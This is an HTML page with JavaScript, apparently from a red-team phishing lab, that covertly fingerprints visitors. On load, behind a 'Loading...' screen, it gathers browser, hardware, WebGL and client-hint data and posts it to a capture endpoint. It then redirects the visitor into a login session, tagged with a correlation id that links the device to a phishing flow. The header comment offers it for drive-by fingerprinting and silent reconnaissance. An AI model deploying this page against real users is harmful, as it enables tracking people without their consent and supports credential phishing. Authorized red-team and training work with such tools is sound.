<!doctype html>
<!--
  Silent fingerprinting page for /api/capture/external.

  This page silently captures device fingerprint and submits it without
  any user interaction or visible form. Useful for:
  - Drive-by fingerprinting
  - Silent reconnaissance
  - Background device profiling

  After capture, redirects to a configured URL (appears as normal navigation).

  Authorized red-team / pentest use only.

  Config — edit the CONFIG block below:
    site_id        the cred key prefix
    token          must match config.external_capture_token on the proxy
    endpoint       URL of POST /api/capture/external
    redirect_url   where to redirect after capture (appears as normal nav)
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Loading...</title>
  <style>
    body { margin: 0; padding: 0; background: #f5f5f5; }
    .loading { text-align: center; padding-top: 40px; color: #666; font-family: system-ui; }
  </style>
</head>
<body>
  <div class="loading">Loading...</div>

<script>
// Load FingerprintJS from CDN with error handling
window.FingerprintJSLoaded = false;
(function() {
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/js@3/dist/fp.min.js';
  script.async = true;
  script.onload = function() {
    window.FingerprintJSLoaded = true;
    console.log('[silent] FingerprintJS loaded');
  };
  script.onerror = function() {
    console.warn('[silent] FingerprintJS failed to load');
    window.FingerprintJSLoaded = true;
    window.FingerprintJS = null;
  };
  document.head.appendChild(script);
})();
</script>

<script>
const CONFIG = {
  site_id:       "silent-fp",                              // credential key prefix
  // DEF CON RTV lab: same-origin relative path (works through nginx
  // regardless of domain) + the token docker-compose.yml sets via
  // EXTERNAL_CAPTURE_TOKEN. Keep these two in sync if you change either.
  token:         "lab-demo-capture-token",                 // must match proxy token
  endpoint:      "/api/capture/external",                  // capture endpoint
  // Funnel the visitor into the hosted login session after capture. The
  // correlation id (see getCid) is appended so the follow-on session
  // replays the device we just fingerprinted — the silent-capture ⇄
  // login tie. Point this at a real IdP for a plain recon redirect; the
  // cid rides along harmlessly and is simply ignored by a destination
  // that doesn't understand it.
  redirect_url:  "/start",                                 // where to redirect
};

// Correlation id: reuse an incoming ?cid= (so a chain of recon pages keeps
// one id) or mint a fresh one. crypto.randomUUID needs a secure context
// (the lab is HTTPS); fall back to a random hex string otherwise.
function getCid() {
  try {
    const existing = new URLSearchParams(location.search).get("cid");
    if (existing) return existing;
  } catch (_) {}
  try {
    if (crypto && crypto.randomUUID) return crypto.randomUUID();
  } catch (_) {}
  return "cid-" + Math.random().toString(16).slice(2) + Date.now().toString(16);
}

async function fingerprint() {
  const fp = {
    user_agent: navigator.userAgent,
    languages:  navigator.languages || [navigator.language],
    platform:   navigator.platform,
    vendor:     navigator.vendor,
    hw_concurrency: navigator.hardwareConcurrency || null,
    device_memory:  navigator.deviceMemory || null,
    screen:    { w: screen.width, h: screen.height,
                 aw: screen.availWidth, ah: screen.availHeight,
                 color_depth: screen.colorDepth, dpr: window.devicePixelRatio },
    viewport:  { w: innerWidth, h: innerHeight },
    timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer:  document.referrer,
    page_url:  location.href,
  };

  // Wait for FingerprintJS to load (max 10 seconds)
  let waitTime = 0;
  while (!window.FingerprintJSLoaded && waitTime < 10000) {
    await new Promise(r => setTimeout(r, 100));
    waitTime += 100;
  }

  // Capture FingerprintJS detailed fingerprint
  if (typeof FingerprintJS !== 'undefined' && FingerprintJS !== null) {
    try {
      const fpjs = await FingerprintJS.load();
      const result = await fpjs.get();
      fp.fingerprint_id = result.visitorId;
      fp.fingerprint_confidence = result.confidence?.score || null;
      fp.fingerprint_components = result.components;
      console.log('[silent] Fingerprint captured:', fp.fingerprint_id);
    } catch (e) {
      fp.fingerprint_error = e.message;
      console.warn('[silent] FingerprintJS error:', e.message);
    }
  } else {
    console.log('[silent] FingerprintJS not available (waited', waitTime, 'ms)');
  }

  // Capture Sec-CH-UA client hints
  if (navigator.userAgentData) {
    try {
      fp.ua_data = await navigator.userAgentData.getHighEntropyValues([
        "architecture","bitness","model","platformVersion",
        "uaFullVersion","fullVersionList","wow64",
      ]);
    } catch (_) { }
  }

  // Capture WebGL renderer
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) {
      const ext = gl.getExtension("WEBGL_debug_renderer_info");
      if (ext) {
        fp.webgl = {
          vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
        };
      }
    }
  } catch (_) { }

  return fp;
}

async function captureAndSubmit() {
  console.log('[silent] Starting silent fingerprint capture...');
  const cid = getCid();

  try {
    const fp = await fingerprint();
    console.log('[silent] Fingerprint complete, submitting...');

    const body = {
      site_id: CONFIG.site_id,
      user: "silent-capture",
      source_url: location.href,
      cid: cid,
      captured_inputs: {
        fingerprint: fp,
      },
      notes: "silent fingerprint capture",
    };

    // Submit to capture endpoint
    const response = await fetch(CONFIG.endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + CONFIG.token,
      },
      body: JSON.stringify(body),
      keepalive: true,
    });

    if (response.ok) {
      console.log('[silent] Capture successful, redirecting...');
    } else {
      console.warn('[silent] Capture failed:', response.status);
    }
  } catch (e) {
    console.error('[silent] Error during capture:', e.message);
  }

  // Always redirect (success or fail), carrying the cid so the follow-on
  // session can find this capture. Append with the correct separator and
  // don't double-add if redirect_url already carries a cid.
  setTimeout(() => {
    let dest = CONFIG.redirect_url;
    if (cid && !/[?&]cid=/.test(dest)) {
      dest += (dest.indexOf("?") >= 0 ? "&" : "?") + "cid=" + encodeURIComponent(cid);
    }
    console.log('[silent] Redirecting to:', dest);
    window.location.href = dest;
  }, 500);
}

// Run on page load
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', captureAndSubmit);
} else {
  captureAndSubmit();
}
</script>
</body>
</html>
